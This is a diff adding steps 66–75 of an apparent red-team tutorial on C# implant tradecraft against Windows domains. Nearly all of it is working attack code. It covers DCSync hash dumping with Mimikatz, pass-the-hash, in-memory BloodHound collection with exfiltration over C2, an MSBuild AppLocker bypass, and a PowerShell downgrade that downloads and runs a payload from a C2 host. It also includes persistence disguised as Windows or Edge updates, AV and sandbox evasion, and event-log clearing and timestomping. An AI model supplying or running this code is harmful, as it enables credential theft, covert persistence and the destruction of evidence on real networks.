@@ -1012,4 +1012,358 @@ ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, n
 Console.WriteLine($"[*] Process created with PID: {outParams["ProcessId"]}");
 ```
 
+### Step 66 — DCSync Attack
+Abusing the DS-Replication-Get-Changes privilege to pull NTLM hashes directly from a Domain Controller without touching LSASS.
+```csharp
+// DCSync does not require running code on the DC.
+// Any account with "Replicating Directory Changes" + "Replicating Directory Changes All"
+// can request replication data remotely — including password hashes.
+
+// Affected rights (check with Step 63 ACL enum):
+// DS-Replication-Get-Changes         (1131f6aa-...)
+// DS-Replication-Get-Changes-All     (1131f6ad-...)
+
+// In C#: use DirectoryServices with MS-DRSR protocol or invoke Mimikatz/Impacket
+// via Process.Start for tooling context, or implement DRSGetNCChanges via P/Invoke.
+
+// Minimal C# approach — invoke via Mimikatz runspace (from Step 44):
+pipeline.Commands.AddScript(
+    @"Invoke-Mimikatz -Command '""lsadump::dcsync /domain:corp.local /all /csv""'");
+
+// Accounts commonly targeted:
+// krbtgt  → Golden Ticket material
+// All domain accounts → full password hash dump
+```
+
+### Step 67 — Pass-the-Hash (PTH) from C#
+Using an NTLM hash instead of a plaintext password to authenticate to remote services.
+```csharp
+// PTH abuses NTLM authentication — the hash IS the credential.
+// Native Windows APIs don't expose PTH directly from managed code.
+// Common approaches from C#:
+
+// 1. Inject hash into a sacrificial logon session via LogonUser + token manipulation
+[DllImport("advapi32.dll", SetLastError = true)]
+static extern bool LogonUser(
+    string lpszUsername, string lpszDomain, string lpszPassword,
+    int dwLogonType, int dwLogonProvider, out IntPtr phToken);
+
+// LOGON32_LOGON_NEW_CREDENTIALS = 9
+// LOGON32_PROVIDER_DEFAULT      = 0
+// This creates a network-only token — outbound connections use the supplied creds
+
+// 2. Overwrite the NTLM hash in an existing logon session via sekurlsa::pth pattern
+// Requires SeDebugPrivilege + write access to LSASS logon session structures
+
+// 3. Use Impacket's psexec/smbclient from a PTH-capable implant
+// or NTLMv2 relay via SMB from a C# listener
+
+// Targets: SMB (445), WMI (135), WinRM (5985), RDP (restricted admin mode)
+```
+
+### Step 68 — BloodHound Data Collection from C#
+Collecting Active Directory relationship data programmatically for attack path analysis.
+```csharp
+// SharpHound is the official C# BloodHound collector.
+// Understanding its internals lets you build custom collectors or integrate
+// collection into your implant without dropping SharpHound.exe to disk.
+
+// Core collection methods (configurable via CollectionMethod enum):
+// Default        → Sessions, Trusts, ACLs, ObjectProps, Containers
+// All            → everything including LocalAdmin, RDP, DCOM, PSRemote
+// DCOnly         → fast — only DC-sourced data (no lateral enumeration)
+// ComputerOnly   → sessions and local group memberships from all hosts
+
+// Key LDAP queries SharpHound performs (reusable from Step 61):
+//   All users with AdminCount=1    → "(&(objectClass=user)(adminCount=1))"
+//   All GPOs                       → "(objectClass=groupPolicyContainer)"
+//   All OUs                        → "(objectClass=organizationalUnit)"
+//   Computers not marked disabled  → "(&(objectClass=computer)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
+
+// In-memory collection pattern (avoid writing JSON to disk):
+// 1. Assembly.Load(sharpHoundBytes) from Step 42
+// 2. Invoke SharpHound.Program.Main with args
+// 3. Intercept FileStream output or redirect to MemoryStream
+// 4. Exfiltrate ZIP bytes over C2 channel
+
+// The resulting ZIP → import directly into BloodHound for path analysis
+```
+
+---
+
+## ⚪ Stage 13 — AppLocker & CLM Bypass Techniques
+> Bypassing application whitelisting and PowerShell Constrained Language Mode.
+
+### Step 69 — AppLocker Enumeration from C#
+Reading AppLocker policy from the registry to understand what execution paths are blocked.
+```csharp
+// AppLocker policies are stored in:
+// HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2\
+
+// Rule categories: Exe, Dll, Script, Msi, Appx
+// Each has: Allow / Deny rules with conditions (Publisher, Path, Hash)
+
+using Microsoft.Win32;
+
+RegistryKey srpKey = Registry.LocalMachine.OpenSubKey(
+    @"SOFTWARE\Policies\Microsoft\Windows\SrpV2");
+
+if (srpKey == null)
+{
+    Console.WriteLine("[*] No AppLocker policy found — enforcement disabled");
+}
+else
+{
+    foreach (string ruleType in srpKey.GetSubKeyNames())
+    {
+        Console.WriteLine($"[AppLocker] Rule type: {ruleType}");
+        RegistryKey ruleKey = srpKey.OpenSubKey(ruleType);
+        // EnforcementMode: 0 = Audit, 1 = Enforced
+        object mode = ruleKey.GetValue("EnforcementMode");
+        Console.WriteLine($"  EnforcementMode: {mode}");
+    }
+}
+```
+
+### Step 70 — MSBuild Inline Task Execution
+Abusing `MSBuild.exe` — a Microsoft-signed binary — to compile and execute C# inline tasks, bypassing AppLocker exe/script rules.
+```xml
+<!-- evil.csproj — executed with: MSBuild.exe evil.csproj -->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Execute">
+    <ClassTask />
+  </Target>
+  <UsingTask TaskName="ClassTask" TaskFactory="CodeTaskFactory"
+             AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+          using Microsoft.Build.Framework;
+          using System.Diagnostics;
+          public class ClassTask : ITask {
+              public IBuildEngine BuildEngine { get; set; }
+              public ITaskHost HostObject { get; set; }
+              public bool Execute() {
+                  Process.Start("cmd.exe", "/c whoami > C:\\Temp\\out.txt");
+                  return true;
+              }
+          }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+```
+
+```csharp
+// Trigger from C# implant:
+Process.Start("MSBuild.exe", @"C:\Temp\evil.csproj");
+
+// Why it bypasses AppLocker:
+// MSBuild.exe is in C:\Windows\Microsoft.NET\ — typically whitelisted by path
+// The .csproj is treated as data, not a script — Script rules don't apply
+// Code compiles and executes entirely in the MSBuild process memory
+```
+
+### Step 71 — Constrained Language Mode Detection & Bypass
+Detecting PowerShell CLM and escaping it using a custom runspace or downgrade attack.
+```csharp
+// Detect CLM from within PowerShell (for recon):
+// $ExecutionContext.SessionState.LanguageMode
+// → ConstrainedLanguage or FullLanguage
+
+// From C# — check if CLM is enforced via __PSLockdownPolicy env var:
+string clmPolicy = Environment.GetEnvironmentVariable("__PSLockdownPolicy");
+if (clmPolicy == "4")
+    Console.WriteLine("[!] PowerShell CLM enforced");
+
+// Bypass 1 — Custom Runspace (Step 44):
+// Runspaces created from C# inherit NO language mode restrictions
+// unless the host explicitly sets InitialSessionState.LanguageMode
+
+InitialSessionState iss = InitialSessionState.CreateDefault();
+iss.LanguageMode = PSLanguageMode.FullLanguage;  // force FullLanguage
+Runspace rs = RunspaceFactory.CreateRunspace(iss);
+rs.Open();
+
+// Bypass 2 — PowerShell version downgrade:
+// powershell -Version 2 -Command "..."
+// PSv2 has no CLM support — LanguageMode does not exist
+// Requires .NET 2.0 / PSv2 to be installed on target
+Process.Start("powershell", "-Version 2 -Command \"IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')\"");
+```
+
+---
+
+## 🟢 Stage 14 — Advanced Post-Exploitation
+> Persistence, situational awareness, and cleanup — operational tradecraft.
+
+### Step 72 — Registry Persistence
+Writing run keys and scheduled task triggers for persistent implant execution.
+```csharp
+using Microsoft.Win32;
+
+// HKCU Run key — persists as current user, no admin required
+RegistryKey runKey = Registry.CurrentUser.OpenSubKey(
+    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", writable: true);
+
+runKey.SetValue("WindowsUpdate", @"C:\Users\Public\implant.exe");
+
+// HKLM Run key — persists system-wide, requires admin
+RegistryKey sysKey = Registry.LocalMachine.OpenSubKey(
+    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", writable: true);
+sysKey.SetValue("WinDefend", @"C:\Windows\Temp\svc.exe");
+
+// Stealth: use existing key names to blend in
+// Common benign names: OneDrive, SecurityHealth, Teams
+
+// WMI subscription persistence (fileless, survives reboots):
+// EventFilter + EventConsumer + FilterToConsumerBinding
+// Requires System.Management — similar to Step 65 WMI usage
+```
+
+### Step 73 — Scheduled Task Creation
+Programmatically creating scheduled tasks via the Task Scheduler COM interface.
+```csharp
+using TaskScheduler;  // COM reference: taskschd.dll
+
+// Connect to Task Scheduler
+ITaskService ts = new TaskScheduler.TaskScheduler();
+ts.Connect();
+
+ITaskDefinition td = ts.NewTask(0);
+td.RegistrationInfo.Description = "Windows Update Helper";
+td.Principal.RunLevel = _TASK_RUNLEVEL.TASK_RUNLEVEL_HIGHEST;
+
+// Trigger: at system startup
+IBootTrigger trigger = (IBootTrigger)td.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_BOOT);
+trigger.Delay = "PT30S";  // 30 second delay after boot
+
+// Action: run implant
+IExecAction action = (IExecAction)td.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
+action.Path = @"C:\Windows\Temp\svc.exe";
+action.Arguments = "";
+
+// Register under a legitimate-looking name
+ITaskFolder rootFolder = ts.GetFolder("\\");
+rootFolder.RegisterTaskDefinition(
+    "MicrosoftEdgeUpdateCore",
+    td,
+    (int)_TASK_CREATION.TASK_CREATE_OR_UPDATE,
+    null, null,
+    _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN,
+    "");
+
+Console.WriteLine("[+] Scheduled task created");
+```
+
+### Step 74 — Situational Awareness
+Automated environment profiling — AV detection, domain status, privilege level, sandbox evasion.
+```csharp
+using System.Diagnostics;
+using System.Management;
+using Microsoft.Win32;
+
+static class SituationalAwareness
+{
+    // Check if running as SYSTEM
+    public static bool IsSystem() =>
+        System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;
+
+    // Check domain membership
+    public static string GetDomain() =>
+        System.Net.NetworkInformation.IPGlobalProperties
+            .GetIPGlobalProperties().DomainName;
+
+    // Detect common AV/EDR processes
+    public static List<string> DetectAV()
+    {
+        string[] avProcesses = {
+            "MsMpEng", "SentinelAgent", "CylanceSvc", "cb",
+            "csfalconservice", "bdagent", "kavfsgt", "ekrn"
+        };
+        return Process.GetProcesses()
+            .Where(p => avProcesses.Contains(p.ProcessName, StringComparer.OrdinalIgnoreCase))
+            .Select(p => p.ProcessName)
+            .ToList();
+    }
+
+    // Detect sandbox / analysis environment
+    public static bool IsSandbox()
+    {
+        // Low RAM = sandbox indicator
+        var query = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
+        ulong ram = (ulong)query.Get().Cast<ManagementObject>().First()["TotalPhysicalMemory"];
+        if (ram < 2_000_000_000UL) return true;
+
+        // Fewer than 2 CPU cores
+        if (Environment.ProcessorCount < 2) return true;
+
+        // Common sandbox usernames
+        string user = Environment.UserName.ToLower();
+        if (user == "sandbox" || user == "maltest" || user == "virus") return true;
+
+        return false;
+    }
+
+    // Check SeDebugPrivilege
+    public static bool HasSeDebug()
+    {
+        try
+        {
+            Process.GetProcessById(4); // System process — requires SeDebugPrivilege
+            return true;
+        }
+        catch { return false; }
+    }
+}
+```
+
+### Step 75 — Anti-Forensics & Cleanup
+Removing artefacts after operation — log clearing, file wiping, timestomping.
+```csharp
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+static class Cleanup
+{
+    // Clear Windows Security and System event logs
+    public static void ClearEventLogs()
+    {
+        string[] logs = { "Security", "System", "Application",
+                          "Microsoft-Windows-PowerShell/Operational" };
+        foreach (string log in logs)
+        {
+            try { new EventLog(log).Clear(); }
+            catch { /* insufficient privileges */ }
+        }
+    }
+
+    // Overwrite file contents before deletion (basic wipe)
+    public static void SecureDelete(string path)
+    {
+        if (!File.Exists(path)) return;
+        long size = new FileInfo(path).Length;
+        using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Write))
+        {
+            byte[] zeros = new byte[size];
+            fs.Write(zeros, 0, zeros.Length);
+        }
+        File.Delete(path);
+    }
+
+    // Timestomp — overwrite file timestamps to blend with system files
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool SetFileTime(IntPtr hFile,
+        ref long lpCreationTime, ref long lpLastAccessTime, ref long lpLastWriteTime);
+
+    public static void Timestomp(string path, DateTime fakeTime)
+    {
+        File.SetCreationTime(path, fakeTime);
+        File.SetLastWriteTime(path, fakeTime);
+        File.SetLastAccessTime(path, fakeTime);
+    }
+}
+```
+
 ---
